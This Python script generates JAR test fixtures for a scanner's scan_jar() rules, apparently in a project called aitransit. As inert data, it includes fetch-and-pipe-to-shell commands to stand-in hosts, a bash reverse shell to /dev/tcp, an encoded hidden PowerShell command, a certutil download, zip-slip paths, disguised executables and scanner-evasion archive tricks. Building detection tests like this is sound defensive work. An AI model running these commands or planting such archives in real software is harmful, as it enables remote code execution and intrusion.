#!/usr/bin/env python3
"""Regenerate the Java-archive fixtures used to test scan_jar().

Run from the repository root:

    python3 tests/fixtures/make_jar_fixtures.py

A .jar is a ZIP file, so the fixtures are assembled with the standard library
rather than the JDK: the test controls exactly which bytes sit in which entry,
including ones a build tool would never produce (a path that escapes the
extraction directory, a ".class" entry that is not bytecode, a Windows
executable stored as "logo.png"). Every payload is an inert stand-in — headers
and strings that trip a rule, never anything that runs.

Output is deterministic: entry timestamps are fixed and compression is level 6,
so regenerating produces byte-identical files and a clean `git diff`.

    --credential-jars OUTDIR   Also write two jars holding a provider-shaped
                               token, read from $AITRANSIT_TEST_TOKEN. Used by
                               the test suite at run time, so the repository
                               never holds a contiguous token.
"""
from __future__ import annotations

import base64
import io
import os
import pathlib
import struct
import sys
import warnings
import zipfile

RULES = pathlib.Path(__file__).resolve().parent / "rules"
STAMP = (2020, 1, 1, 0, 0, 0)

# ── Byte shapes ─────────────────────────────────────────────────────────────
ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
MACHO = b"\xcf\xfa\xed\xfe\x07\x00\x00\x01" + b"\x00" * 56


def pe() -> bytes:
    """The smallest thing that is a PE file to a header check: MZ, e_lfanew, PE\\0\\0."""
    return b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x80) + b"\x00" * 0x40 + b"PE\x00\x00" + b"\x00" * 64


def cls(*strings: str) -> bytes:
    """A class file whose constant pool holds the given UTF-8 constants."""
    pool = b"".join(b"\x01" + struct.pack(">H", len(s.encode())) + s.encode() for s in strings)
    return (b"\xca\xfe\xba\xbe" + struct.pack(">HHH", 0, 52, len(strings) + 1) + pool
            + struct.pack(">HHHHHHHH", 0x21, 0, 0, 0, 0, 0, 0, 0))


def manifest(**attrs: str) -> bytes:
    lines = ["Manifest-Version: 1.0"] + [f"{k.replace('_', '-')}: {v}" for k, v in attrs.items()]
    return ("\r\n".join(lines) + "\r\n\r\n").encode()


def zbytes(entries: list[tuple], symlinks: tuple = ()) -> bytes:
    """Entries are (name, bytes). `symlinks` is (name, target) pairs, stored as Unix symlinks."""
    buf = io.BytesIO()
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")  # duplicate names are the point of one fixture
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as z:
            for name, data in entries:
                zi = zipfile.ZipInfo(name, STAMP)
                zi.compress_type = zipfile.ZIP_DEFLATED
                zi.external_attr = 0o644 << 16
                z.writestr(zi, data)
            for name, target in symlinks:
                zi = zipfile.ZipInfo(name, STAMP)
                zi.create_system = 3
                zi.external_attr = 0o120777 << 16
                z.writestr(zi, target.encode())
    return buf.getvalue()


def locate(data: bytes, name: bytes) -> tuple[int, int]:
    """Offsets of the local and central header of the entry called `name`."""
    found = []
    for sig, nl_off, base in ((b"PK\x03\x04", 26, 30), (b"PK\x01\x02", 28, 46)):
        pos, i = -1, data.find(sig)
        while i != -1:
            nl = struct.unpack_from("<H", data, i + nl_off)[0]
            if data[i + base:i + base + nl] == name:
                pos = i
                break
            i = data.find(sig, i + 4)
        found.append(pos)
    return found[0], found[1]


def poke(buf: bytearray, pos: int, fmt: str, value: int) -> None:
    struct.pack_into(fmt, buf, pos, value)


def write(path: pathlib.Path, data: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)


def jar(name: str, entries: list[tuple[str, bytes]], where: pathlib.Path = RULES) -> bytes:
    data = zbytes(entries)
    write(where / name, data)
    return data


def main() -> None:
    ok = ("com/example/app/Util.class", cls("java/lang/String", "toString"))

    if "--credential-jars" in sys.argv:
        out = pathlib.Path(sys.argv[sys.argv.index("--credential-jars") + 1])
        token = os.environ["AITRANSIT_TEST_TOKEN"]
        jar("jar_cred_text.jar", [("config/app.properties", f"api.token={token}\n".encode()), ok], out)
        jar("jar_cred_class.jar", [("com/x/Client.class", cls("Authorization", token))], out)
        jar("jar_cred_utf16.jar", [("config/app.properties", b"\xff\xfe" + f"api.token={token}\n".encode("utf-16-le")), ok], out)
        return

    # ── Must PASS the FAIL tier ─────────────────────────────────────────────
    # An ordinary library: Main-Class, a relative Class-Path, a signature file,
    # prose that mentions curl, wget and powershell without piping anything,
    # a text file that merely starts with "MZ", and a class stored as ".bin"
    # (kotlinx-coroutines does exactly that; 0xCAFEBABE is also the Mach-O fat
    # magic, so a check that treats it as native flags a legitimate library).
    jar("jar_safe.jar", [
        ("META-INF/MANIFEST.MF", manifest(Main_Class="com.example.app.Main",
                                          Class_Path="lib/dep.jar lib/other.jar",
                                          Created_By="17.0.2 (Eclipse Adoptium)")),
        ("META-INF/SIGNER.SF", b"Signature-Version: 1.0\r\n\r\n"),
        ("com/example/app/Main.class", cls("java/lang/Object", "main",
                                           "run: curl -fsSL https://example.com/f -o out",
                                           "wget --version", "powershell.exe", "/dev/null")),
        ok,
        ("config/app.properties", b"server.url=http://example.com/\ndb.password=${DB_PASSWORD}\n"),
        ("res/notes.txt", b"MZ is the DOS magic and ELF the Unix one; neither is a header here. " * 2),
        ("docs/keys.txt", b"-----BEGIN RSA PRIVATE KEY-----\nStore the key in an HSM and never commit it to source control.\nRotate it every ninety days and revoke it on any suspicion of exposure.\n"),
        ("res/probe.bin", cls("kotlinx/coroutines/debug/internal/DebugProbesKt")),
        # sshd-common keeps "-----BEGIN OPENSSH PRIVATE KEY-----" as a constant and,
        # a line later in the view, a 78-character class path. Neighbouring
        # constants are not a key body.
        ("org/apache/sshd/KeyParser.class", cls(
            "-----BEGIN OPENSSH PRIVATE KEY-----",
            "org/apache/sshd/common/config/keys/loader/openssh/OpenSSHKeyPairResourceParser",
            "-----END OPENSSH PRIVATE KEY-----")),
    ])

    # Larger than the test knobs allow, but ordinary at default limits.
    jar("jar_big.jar", [
        ("META-INF/MANIFEST.MF", manifest(Main_Class="com.example.Big")),
        ("res/big.txt", (b"x" * 79 + b"\n") * 40000),
        ("res/more.txt", b"second text entry\n"),
    ])

    # ── FAIL tier ───────────────────────────────────────────────────────────
    zipslip = jar("jar_zipslip.jar", [
        ("../../../tmp/aitransit_escape.sh", b"#!/bin/sh\nid\n"),
        ("/etc/cron.d/aitransit", b"* * * * * root id\n"),
        ("ok/Hello.class", cls("hello")),
    ])
    jar("jar_fake_class.jar", [
        ("com/x/Real.class", cls("real")),
        ("com/x/Dropper.class", b"#!/bin/sh\ncurl -s https://x.example | sh\n"),
    ])
    jar("jar_hidden_exe.jar", [
        ("res/logo.png", pe()),
        ("data/blob.dat", ELF),
        ("res/icon.gif", MACHO),
        ("com/x/Real.class", cls("real")),
    ])
    jar("jar_remote_classpath.jar", [
        ("META-INF/MANIFEST.MF", manifest(Class_Path="lib/a.jar http://evil.example/x.jar /opt/y.jar")),
        ok,
    ])
    # A symlink is created on extraction and the next entry is written through
    # it, so one that points outside the archive is zip-slip in two steps. The
    # second link is an ordinary relative one and only warns.
    write(RULES / "jar_symlink.jar", zbytes([ok], symlinks=(("lib", "../../etc"), ("libfoo.so", "libfoo.so.1"))))
    # Text with no recognised extension is read; a binary entry that contains the
    # same string is not (it would be noise).
    jar("jar_text_unlisted.jar", [
        ("res/payload.dat", b"curl -fsSL http://x.example/i | sh\n"),
        ("res/binary.dat", b"\x00\x01\x02curl -fsSL http://y.example/i | sh\x00\xff\xfe" * 40),
        ok,
    ])
    # Key material in a resource. The body is a placeholder-free run of base64;
    # the header alone is not enough for the rule (it must be followed by a body).
    body = base64.b64encode(bytes((i * 7 + 3) % 256 for i in range(144))).decode()
    pem = "-----BEGIN RSA PRIVATE KEY-----\n" + "\n".join(body[i:i + 64] for i in range(0, len(body), 64)) + "\n-----END RSA PRIVATE KEY-----\n"
    # Once as a text resource, once as ONE string constant in a class file.
    jar("jar_private_key.jar", [("certs/server.key", pem.encode()), ("com/x/Keys.class", cls(pem)), ok])
    # The slip is the LAST entry. The limit on how many entries are read must
    # not also limit how many names are checked.
    jar("jar_late_slip.jar", [
        ("a/One.class", cls("one")), ("a/Two.class", cls("two")), ("a/Three.class", cls("three")),
        ("../../late_escape.sh", b"id\n"),
    ])
    jar("jar_nested_evil.jar", [
        ("META-INF/MANIFEST.MF", manifest(Main_Class="com.example.Outer")),
        ("lib/inner.jar", zbytes([("../escape.txt", b"x"), ("a/B.class", cls("b"))])),
        ok,
    ])
    jar("jar_hostile_text.jar", [
        ("scripts/setup.sh", b"#!/bin/sh\ncurl -fsSL http://x.example/i.sh | sh\n"),
        ("config/shell.properties", b"cmd=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"),
        ("config/ps.properties",
         b"ps=powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n"),
        ("config/win.properties", b"dl=certutil -urlcache -split -f http://x.example/a.exe a.exe\n"),
        ok,
    ])
    # The same shapes inside a class file's constant pool. Only a parser that
    # reads the pool sees these as strings: they sit between binary length fields.
    # The shell string is exactly 65 bytes, so its length field in the pool is
    # 0x41 -- the letter "A". A reader that just pulls printable runs out of the
    # bytes sees "Acurl …" and the word boundary in front of "curl" is gone;
    # only a parser that reads the pool as structure finds it.
    sh65 = "curl -fsSL http://x.example/install.sh" + " " * 23 + "| sh"
    assert len(sh65) == 65
    jar("jar_hostile_class.jar", [
        ("com/x/Loader.class", cls("java/lang/Runtime", sh65, "mimikatz")),
    ])
    write(RULES / "jar_not_zip.jar", ELF + b"\x00" * 200)  # claims to be a jar, is an ELF
    write(RULES / "jar_prepended_pe.jar", pe() + zbytes([ok]))

    # The scanner's severity downgrade greps the whole message for ":LOW:" and
    # friends, and an entry name is part of the message.
    jar("jar_severity_marker.jar", [("../../tmp/evil:LOW:.sh", b"id\n"), ok])

    # ── Reader differences: what the JVM sees and a strict reader does not ───
    # Python's zipfile refuses an entry whose CRC, local name or declared size
    # disagree with the central directory. java.util.zip.ZipFile and unzip do not
    # care about any of the three, so each of these is an entry the JVM reads and
    # a strict reader would drop. The scanner reads entries itself, like the JVM.
    hostile_mf = manifest(Class_Path="lib/a.jar http://evil.example/x.jar")
    bad_crc = bytearray(zbytes([("META-INF/MANIFEST.MF", hostile_mf), ok]))
    loc, cen = locate(bytes(bad_crc), b"META-INF/MANIFEST.MF")
    poke(bad_crc, loc + 14, "<I", 0xDEADBEEF)
    poke(bad_crc, cen + 16, "<I", 0xDEADBEEF)
    write(RULES / "jar_bad_crc.jar", bytes(bad_crc))

    bad_name = bytearray(zbytes([("META-INF/MANIFEST.MF", hostile_mf), ok]))
    loc, _ = locate(bytes(bad_name), b"META-INF/MANIFEST.MF")
    bad_name[loc + 30 + len("META-INF/MANIFEST.M")] = ord("X")  # local header says MANIFEST.MX
    write(RULES / "jar_local_name_mismatch.jar", bytes(bad_name))

    prefix = b"just some benign notes\n"
    short = bytearray(zbytes([("res/notes.txt", prefix + b"curl -fsSL http://x.example/i | sh\n"), ok]))
    loc, cen = locate(bytes(short), b"res/notes.txt")
    poke(short, loc + 22, "<I", len(prefix))   # declared uncompressed size: just the prefix
    poke(short, cen + 24, "<I", len(prefix))
    write(RULES / "jar_short_declared_size.jar", bytes(short))

    # LZMA (method 14) over bytes that are not LZMA: the entry cannot be read. The
    # archive must still be reported, and its other entries still scanned.
    lz = bytearray(zbytes([("res/lz.txt", b"data " * 50),
                           ("scripts/setup.sh", b"curl -fsSL http://x.example/i | sh\n")]))
    loc, cen = locate(bytes(lz), b"res/lz.txt")
    poke(lz, loc + 8, "<H", 14)
    poke(lz, cen + 10, "<H", 14)
    write(RULES / "jar_lzma_corrupt.jar", bytes(lz))

    # A symlink to /etc stored with deflate64 (method 9): the target cannot be
    # read here, but unzip can, and creates the link.
    sl = bytearray(zbytes([], symlinks=(("lnk", "/etc"),)))
    loc, cen = locate(bytes(sl), b"lnk")
    poke(sl, loc + 8, "<H", 9)
    poke(sl, cen + 10, "<H", 9)
    write(RULES / "jar_symlink_unreadable.jar", bytes(sl))

    # A local file record that the central directory does not list. A reader that
    # walks local headers (ZipInputStream, JarInputStream, several scanners) sees
    # ../../tmp/evil.sh; JarFile, unzip and Python do not.
    base = zbytes([ok])
    eocd = base.rfind(b"PK\x05\x06")
    cd_off = struct.unpack_from("<I", base, eocd + 16)[0]
    orphan_name = b"../../tmp/aitransit_orphan.sh"
    orphan_data = b"#!/bin/sh\nid\n"
    orphan = (b"PK\x03\x04" + struct.pack("<HHHHHIIIHH", 20, 0, 0, 0x21, 0x5821, 0, len(orphan_data),
                                           len(orphan_data), len(orphan_name), 0)
              + orphan_name + orphan_data)
    out = bytearray(base[:cd_off] + orphan + base[cd_off:])
    poke(out, eocd + len(orphan) + 16, "<I", cd_off + len(orphan))
    write(RULES / "jar_orphan_local.jar", bytes(out))

    # UTF-16 text: every byte-oriented rule sees NULs between the letters.
    jar("jar_utf16.jar", [
        ("config/run.properties", b"\xff\xfe" + "cmd=curl -fsSL http://x.example/i | sh\n".encode("utf-16-le")),
        ("win/fetch.txt", "certutil -urlcache -f http://x.example/a.exe a.exe\r\n".encode("utf-16-le")),
        ok,
    ])

    # PEM bodies wrapped short of 60 characters a line: OpenSSL reads them fine.
    short_pem = "-----BEGIN RSA PRIVATE KEY-----\n" + "\n".join(body[i:i + 40] for i in range(0, len(body), 40)) + "\n-----END RSA PRIVATE KEY-----\n"
    jar("jar_private_key_short.jar", [("certs/short.key", short_pem.encode()), ok])

    # The first-cut rules were windows: a long URL, a continued line, an absolute
    # or env-wrapped shell, a long run of PowerShell flags.
    ps_blob = base64.b64encode("Write-Host 'aitransit fixture payload'".encode("utf-16-le")).decode()
    jar("jar_hostile_variants.jar", [
        ("v/long_url.txt", b"curl -fsSL http://x.example/" + b"a" * 250 + b" | sh\n"),
        ("v/continued.txt", b"curl -fsSL http://x.example/i \\\n  | sh\n"),
        ("v/abs_sh.txt", b"curl -fsSL http://x.example/i | /bin/sh\n"),
        ("v/env_bash.txt", b"wget -qO- http://x.example/i | /usr/bin/env bash\n"),
        ("v/ps_flags.txt", ("powershell " + "-NoProfile " * 20 + "-enc " + ps_blob + "\n").encode()),
        ok,
    ])

    # A PE whose e_lfanew is past the first 4 KB, and a fat Mach-O, whose magic is
    # 0xCAFEBABE followed by an architecture count: a class has a major version >= 45.
    late = bytearray(b"MZ" + b"\x00" * 5100)
    poke(late, 0x3C, "<I", 5000)
    late[5000:5004] = b"PE\x00\x00"
    fat = b"\xca\xfe\xba\xbe\x00\x00\x00\x02" + b"\x00" * 80
    jar("jar_pe_late.jar", [("res/logo.png", bytes(late)), ok])
    jar("jar_fat_macho.jar", [("res/icon.gif", fat), ("com/x/Fat.class", fat), ok])

    # Payload in the part of a class file that is not the constant pool: a custom
    # attribute loads fine and holds anything.
    jar("jar_class_attribute.jar", [
        ("com/x/Attr.class", cls("real") + b"\x00\x01\x00\x00curl -fsSL http://x.example/i | sh\x00"),
    ])

    # ── Benign shapes that must not block ───────────────────────────────────
    # Finder adds AppleDouble resource forks as __MACOSX/…/._Name.class.
    jar("jar_macosx.jar", [
        ("com/foo/Bar.class", cls("bar")),
        ("__MACOSX/com/foo/._Bar.class", b"\x00\x05\x16\x07\x00\x02\x00\x00Mac OS X        " + b"\x00" * 40),
    ])
    # wait-for-it.sh and its many copies probe a port with /dev/tcp.
    jar("jar_waitforit.jar", [
        ("scripts/wait-for-it.sh", b"#!/bin/bash\nwait_for() { (echo > /dev/tcp/$HOST/$PORT) >/dev/null 2>&1; }\n"),
        ok,
    ])
    # Native helpers by convention: extensionless in a platform directory, .pyd, .o.
    jar("jar_native_helpers.jar", [
        ("native/linux-x86_64/spawn-helper", ELF),
        ("lib/_speedups.pyd", pe()),
        ("native/obj/x.o", ELF),
        ok,
    ])

    # ── WARN tier ───────────────────────────────────────────────────────────
    jar("jar_agent.jar", [
        ("META-INF/MANIFEST.MF", manifest(Premain_Class="com.example.Agent",
                                          Can_Redefine_Classes="true")),
        ("com/example/Agent.class", cls("premain")),
    ])
    jar("jar_native.jar", [
        ("native/linux/libx.so", ELF),
        ("native/win/x.dll", pe()),
        ("native/mac/libx.dylib", MACHO),
        ("com/x/Real.class", cls("real")),
    ])
    jar("jar_scripts.jar", [
        ("bin/install.sh", b"#!/bin/sh\necho installing\n"),
        ("win/setup.bat", b"@echo off\r\necho installing\r\n"),
        ok,
    ])
    jar("jar_nested_deep.jar", [
        ("lib/a.jar", zbytes([("lib/b.jar", zbytes([("../escape.txt", b"x")])), ok])),
        ok,
    ])
    jar("jar_duplicates.jar", [
        ("com/x/Same.class", cls("first")),
        ("com/x/Same.class", cls("second")),
    ])
    enc = bytearray(zbytes([("secret/Payload.class", cls("hidden")), ok]))
    for sig, off in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):  # general-purpose flag, bit 0 = encrypted
        i = enc.find(sig)
        while i != -1:
            enc[i + off] |= 0x01
            i = enc.find(sig, i + 4)
    write(RULES / "jar_encrypted.jar", bytes(enc))
    write(RULES / "jar_truncated.jar", zbytes([ok, ("a/B.class", cls("b") * 50)])[:90])
    write(RULES / "jar_empty.jar", b"")
    # Arbitrary bytes before an otherwise valid archive (a launch script is the
    # common, benign case and is reported separately).
    write(RULES / "jar_prepended_data.jar", b"JUNKJUNKJUNK" + zbytes([ok]))
    # A nested "archive" that is not one.
    jar("jar_nested_broken.jar", [("lib/broken.jar", b"PK\x03\x04" + b"garbage" * 10), ok])
    # An entry stored with a compression method no reader here supports (99, the
    # WinZip AES marker): it can be listed but not read.
    odd = bytearray(zbytes([("res/odd.txt", b"some text that deflates\n" * 20)]))
    for sig, off in ((b"PK\x03\x04", 8), (b"PK\x01\x02", 10)):  # compression method field
        i = odd.find(sig)
        while i != -1:
            odd[i + off:i + off + 2] = struct.pack("<H", 99)
            i = odd.find(sig, i + 4)
    write(RULES / "jar_unreadable.jar", bytes(odd))
    write(RULES / "jar_prepended_script.jar",
          b'#!/bin/sh\nexec java -jar "$0" "$@"\nexit 1\n' + zbytes([ok]))

    # ── Routing: same container, other extensions, upper case ───────────────
    for ext in ("war", "ear", "aar"):
        write(RULES / f"jar_routing.{ext}", zipslip)
    write(RULES / "case_UPPER.JAR", zipslip)

    # ── Build-tool wrappers, matched by basename ────────────────────────────
    gw_main = ("org/gradle/wrapper/GradleWrapperMain.class", cls("org/gradle/wrapper/GradleWrapperMain"))
    gw_cli = ("org/gradle/cli/CommandLineParser.class", cls("org/gradle/cli/CommandLineParser"))
    gw_mf = ("META-INF/MANIFEST.MF", manifest(Main_Class="org.gradle.wrapper.GradleWrapperMain"))
    jar("gradle-wrapper.jar", [gw_mf, gw_main, gw_cli], RULES / "wrapper_good")
    jar("gradle-wrapper.jar", [gw_mf, gw_main, gw_cli,
                               ("com/evil/Dropper.class", cls("dropper")),
                               ("install.sh", b"#!/bin/sh\nid\n")], RULES / "wrapper_evil")
    jar("gradle-wrapper.jar", [gw_mf, gw_cli], RULES / "wrapper_hollow")
    jar("gradle-wrapper.jar", [
        ("META-INF/MANIFEST.MF", manifest(Main_Class="org.gradle.wrapper.GradleWrapperMain", Multi_Release="true")),
        gw_main, gw_cli,
        ("META-INF/versions/21/org/gradle/wrapper/GradleWrapperMain.class", cls("replacement")),
    ], RULES / "wrapper_multirelease")
    jar("maven-wrapper.jar", [
        ("META-INF/MANIFEST.MF", manifest()),
        ("org/apache/maven/wrapper/MavenWrapperMain.class", cls("MavenWrapperMain")),
        ("org/apache/maven/wrapper/Downloader.class", cls("Downloader")),
    ], RULES / "wrapper_maven")


if __name__ == "__main__":
    main()
